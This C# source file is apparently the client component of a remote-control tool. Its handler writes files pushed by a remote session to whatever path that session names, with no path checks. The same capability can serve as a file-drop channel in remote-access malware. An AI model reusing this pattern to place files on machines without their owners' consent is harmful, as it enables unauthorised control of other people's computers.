using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using System.Threading;
using System.IO;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestUploadHandler : AbstractRequestHandler
    {
        private RequestStartDownload _request = null;
        private Dictionary<string, FileStream> _fileUploadDic = new Dictionary<string, FileStream>();

        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST)
            {
                var req = reqObj as RequestStartUploadHeader;
                if (_fileUploadDic.ContainsKey(req.Id))
                    return;
                FileStream fs = new FileStream(req.To, FileMode.Create, FileAccess.Write);
                _fileUploadDic.Add(req.Id, fs);
            }
            else if (reqType == ePacketType.PACKET_START_UPLOAD_RESPONSE)
            {
                var resp = reqObj as ResponseStartUpload;
                if (_fileUploadDic.ContainsKey(resp.Id))
                {
                    FileStream fs = _fileUploadDic[resp.Id];
                    fs.Write(resp.Data, 0, resp.Data.Length);
                }
            }
            else if (reqType == ePacketType.PACKET_STOP_UPLOAD_REQUEST)
            {
                var req = reqObj as RequestStopUpload;
                if (_fileUploadDic.ContainsKey(req.Id))
                {
                    _fileUploadDic[req.Id].Close();
                    _fileUploadDic[req.Id].Dispose();
                    _fileUploadDic.Remove(req.Id);
                }
            }
        }
    }
}
